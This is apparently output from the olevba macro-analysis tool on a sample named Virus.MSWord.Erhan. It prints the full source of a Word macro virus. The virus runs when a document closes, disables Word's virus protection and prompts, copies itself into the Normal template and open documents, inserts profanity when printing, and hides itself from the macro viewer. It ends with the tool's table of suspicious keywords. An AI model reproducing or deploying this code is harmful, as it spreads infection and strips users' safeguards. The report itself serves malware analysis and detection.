olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Erhan-89ecf4035c273b98af0eea4c2f93cd9122f66650
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Erhan-89ecf4035c273b98af0eea4c2f93cd9122f66650 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Fuck Off
'2000ã. Áðÿíñê, ÁÃÒÓ
Private Sub Document_Close()
  On Error Resume Next
  s = ActiveDocument.Saved
  Application.EnableCancelKey = Not -1
  
  With Options
    .ConfirmConversions = 0
    .VirusProtection = 0
    .SaveNormalPrompt = 0
  End With

  Arl = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
  ReDim Ar(1 To Arl) As String
  For i = 1 To Arl
    Ar(i) = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
  Next i
  
  If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Fuck Off" Then
     Set t = NormalTemplate.VBProject.VBComponents.Item(1)
     For i = 1 To Arl
       If (Left(Ar(i), 6) = "'Sub F") Or (Left(Ar(i), 6) = "'Sub T") Or (Left(Ar(i), 6) = "'Sub V") Then
         t.CodeModule.InsertLines i, Right(Ar(i), Len(Ar(i)) - 1)
       Else
         t.CodeModule.InsertLines i, Ar(i)
       End If
     Next i
  ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "'Fuck Off" Then
     Set t = ActiveDocument.VBProject.VBComponents.Item(1)
     For i = 1 To Arl
       If (Left(Ar(i), 5) = "Sub F") Or (Left(Ar(i), 5) = "Sub T") Or (Left(Ar(i), 5) = "Sub V") Then
         t.CodeModule.InsertLines i, "'" + Ar(i)
       Else
         t.CodeModule.InsertLines i, Ar(i)
       End If
     Next i
  Else
     t = ""
  End If
  
  If t <> "" Then
    If (Left(ActiveDocument.Name, 8) <> "Document") Or (Left(ActiveDocument.Name, 8) <> "Äîêóìåíò") Then
      ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
  End If
  
  If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub
Private Sub ToBlja(x, y)
    Application.EnableCancelKey = Not -1
    Set dlg1 = Dialogs(wdDialogEditReplace)
    With dlg1
       .Find = x
       .Replace = y
       .ReplaceAll = 1
       .Execute
    End With
End Sub
'Sub FilePrintDefault()
    ToBlja ", ", ", áëÿ "
    On Error GoTo ErHan
    ActiveDocument.PrintOut
    ToBlja ", áëÿ ", ", "
    Exit Sub
ErHan:
    On Error GoTo 0
    ToBlja ", áëÿ ", ", "
    Resume
End Sub
'Sub FilePrint()
    ToBlja ", ", ", áëÿ "
    On Error GoTo ErHan
    Dialogs(wdDialogFilePrint).Show
    ToBlja ", áëÿ ", ", "
    Exit Sub
ErHan:
    On Error GoTo 0
    ToBlja ", áëÿ ", ", "
    Resume
End Sub
'Sub ToolsMacro()
  MsgBox "Ìàêðîñîâ íåò íè â îäíîì îòêðûòîì äîêóìåíòå!", vbExclamation, "Îøèáêà"
End Sub
'Sub ViewVBCode()
  ToolsMacro
End Sub
'Sub ToolsOptions()
  With Options
    .ConfirmConversions = 1
    .VirusProtection = 1
    .SaveNormalPrompt = 1
  End With
  Dialogs(wdDialogToolsOptions).Show
  With Options
    .ConfirmConversions = 0
    .VirusProtection = 0
    .SaveNormalPrompt = 0
  End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

